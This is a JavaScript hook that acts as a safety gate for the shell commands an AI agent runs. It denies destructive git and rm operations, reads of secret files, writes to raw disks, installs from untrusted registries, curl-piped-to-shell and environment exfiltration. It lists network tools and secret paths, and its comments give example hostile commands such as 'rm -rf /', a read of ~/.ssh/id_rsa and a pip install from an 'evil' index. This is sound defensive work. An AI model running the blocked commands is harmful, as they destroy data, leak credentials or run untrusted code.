/**
 * A HARDENED compiled Bash safety gate — the operation-normalized successor to
 * safe-bash-guard.mjs.
 *
 * Same intent (block destructive git, forced `rm`, verification bypass, secret
 * reads, `curl | sh`) plus three disasters the naive guard missed (raw-disk `dd`,
 * env-exfiltration, supply-chain installs) — but matched over
 * `leafCommandsNormalized()` instead of literal tokens. Because it compares
 * against the OPERATION (basename-normalized head, quote-unwrapped args, $HOME/~
 * canonicalized, short/long flag aliases unified) it is robust to the
 * semantics-preserving obfuscations that defeat a Lit-only matcher:
 *
 *   git push '--force'        (quoted flag)          /bin/rm -rf /   (interpreter path)
 *   \rm -rf /                 (backslash head)        git commit -n   (flag alias)
 *   cat "$HOME/.ssh/id_rsa"   ($HOME for ~)           /usr/bin/git …  (absolute git)
 *
 * It also fixes the naive guard's over-blocking: the forced-`rm` rule fires ONLY
 * on dangerous targets (`/`, `~`, `*`, system dirs), so benign
 * `rm -rf node_modules|dist|build` is allowed.
 *
 * Self-contained matcher: the only import is `vigiles/hook` (here the built
 * `../../dist/hook.js`), from which it pulls `leafCommandsNormalized`. It writes
 * no exit code / JSON field — `vigiles compile` emits the protocol; the
 * `vigiles hook-runtime run-program` entrypoint runs it.
 */
import {
  experimental_defineHook,
  deny,
  allow,
  leafCommandsNormalized,
} from "../../dist/hook.js";

// --- policy predicates over the normalized leaves --------------------------

const NET_SINKS = new Set(["curl", "wget", "nc", "ncat", "netcat"]);
const ENV_SOURCES = new Set(["env", "printenv"]);
const SHELLS = new Set(["sh", "bash", "zsh", "dash", "ksh"]);
const SECRET_PREFIXES = ["~/.ssh", ".env", "id_rsa", "id_ed25519"];

// A raw block device — dd here is an unrecoverable disk wipe.
const RAW_DISK = /^of=\/dev\/(sd|nvme|vd|hd|mmcblk|xvd)/;

// System / home roots whose forced deletion is catastrophic.
const SYSTEM_DIR =
  /^\/(etc|usr|bin|sbin|var|boot|dev|lib|lib64|sys|root)(\/|$)/;

/** Does a normalized token name a dangerous rm target? */
function isDangerousTarget(tok) {
  return (
    tok === "/" ||
    tok === "~" ||
    tok.startsWith("~/") ||
    tok === "*" ||
    tok === "/*" ||
    SYSTEM_DIR.test(tok)
  );
}

/** Boundary-aware: does a token sit at/under a sensitive path prefix? */
function tokenUnder(tok, prefix) {
  const t = tok.replace(/^\.\//, "");
  return (
    t === prefix ||
    t.startsWith(prefix + "/") ||
    t.endsWith("/" + prefix) ||
    t.includes("/" + prefix + "/")
  );
}

/** A shell leaf reading from stdin (no script-file argument) — the `| sh` sink. */
function isBareShell(leaf) {
  return SHELLS.has(leaf.head) && leaf.args.every((a) => a.startsWith("-"));
}

/** git leaf running subcommand `sub` (the subcommand is a bare token in args). */
function gitRuns(leaf, sub) {
  return leaf.head === "git" && leaf.args.includes(sub);
}

export default experimental_defineHook({
  on: "PreToolUse",
  decide: (e) => {
    const leaves = leafCommandsNormalized(e.command.raw);

    for (const leaf of leaves) {
      // destructive git — force-push
      if (gitRuns(leaf, "push") && leaf.hasFlag("force", "f"))
        return deny("force-push to a protected branch is blocked");

      // destructive git — reset --hard
      if (gitRuns(leaf, "reset") && leaf.hasFlag("hard"))
        return deny("`git reset --hard` discards committed work");

      // verification bypass — commit --no-verify / -n
      if (gitRuns(leaf, "commit") && leaf.hasFlag("no-verify", "n"))
        return deny("`--no-verify` skips your pre-commit gates");

      // forced rm — ONLY on a dangerous target (benign cleanup is allowed)
      if (
        leaf.head === "rm" &&
        leaf.hasFlag("force", "f") &&
        leaf.args.some(isDangerousTarget)
      )
        return deny(
          "a forced `rm` of a system/home path is blocked — this is unrecoverable",
        );

      // secret / private-key read
      if (
        leaf.args.some((tok) => SECRET_PREFIXES.some((p) => tokenUnder(tok, p)))
      )
        return deny("reading a private key / secret file is blocked");

      // disk destruction — dd to a raw block device
      if (leaf.head === "dd" && leaf.args.some((a) => RAW_DISK.test(a)))
        return deny("`dd` to a raw disk device wipes the drive — blocked");

      // supply chain — pip install from an untrusted index. The index can be set
      // by a flag (`--index-url`/`-i`) OR a command-level env-ASSIGNMENT
      // (`PIP_INDEX_URL=http://evil pip install x`), which is not an argv word and
      // is invisible to a flag-only check — hence the `hasAssign` arm.
      const pipHead = leaf.head === "pip" || leaf.head === "pip3";
      const pyPip =
        (leaf.head === "python" || leaf.head === "python3") &&
        leaf.args.includes("pip");
      if (
        (pipHead || pyPip) &&
        leaf.args.includes("install") &&
        (leaf.hasFlag("index-url", "extra-index-url", "i") ||
          leaf.hasAssign("PIP_INDEX_URL", "PIP_EXTRA_INDEX_URL"))
      )
        return deny("pip install from an untrusted index URL is blocked");

      // supply chain — npm/yarn/pnpm install from an untrusted registry, set by a
      // `--registry` flag OR an `NPM_CONFIG_REGISTRY=…` env-assignment.
      if (
        (leaf.head === "npm" || leaf.head === "yarn" || leaf.head === "pnpm") &&
        leaf.args.includes("install") &&
        (leaf.hasFlag("registry") ||
          leaf.hasAssign("NPM_CONFIG_REGISTRY", "npm_config_registry"))
      )
        return deny("package install from an untrusted registry is blocked");
    }

    // remote code execution — a pipe into a bare shell interpreter
    if (leaves.some(isBareShell))
      return deny("`curl | sh` (remote code execution) is blocked");

    // env-exfiltration — an env dump AND a network sink in the same command
    const hasEnvSource = leaves.some((l) => ENV_SOURCES.has(l.head));
    const hasNetSink = leaves.some((l) => NET_SINKS.has(l.head));
    if (hasEnvSource && hasNetSink)
      return deny("piping the environment to a network sink is blocked");

    return allow();
  },
});
